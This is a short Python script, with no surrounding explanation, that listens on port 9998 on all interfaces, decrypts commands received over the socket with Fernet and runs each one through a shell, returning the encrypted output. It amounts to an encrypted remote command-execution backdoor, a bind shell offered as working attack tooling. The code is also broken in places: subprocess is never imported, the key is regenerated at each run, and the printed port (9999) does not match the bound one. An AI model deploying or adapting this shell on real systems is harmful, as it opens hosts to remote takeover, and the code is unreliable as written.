import socket
from cryptography.fernet import Fernet

key = Fernet.generate_key()  #store this in a secure manner.
cipher = Fernet(key)

def handle_client(client_socket):
    while True:
        #command from client
        encrypted_cmd = client_socket.recv(1024)
        cmd = cipher.decrypt(encrypted_cmd).decode('utf-8')
        
        if cmd == "exit":
            break
        
        #Execute command!
        output = ""
        try:
            output = subprocess.check_output(cmd, shell=True)
        except Exception as e:
            output = str(e).encode()

        #encrypted output
        encrypted_output = cipher.encrypt(output)
        client_socket.send(encrypted_output)
    
    client_socket.close()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('0.0.0.0', 9998))
server.listen(5)

print("[*] Listening on 0.0.0.0:9999")
client_socket, addr = server.accept()
print(f"[*] Accepted connection from: {addr[0]}:{addr[1]}")
handle_client(client_socket)
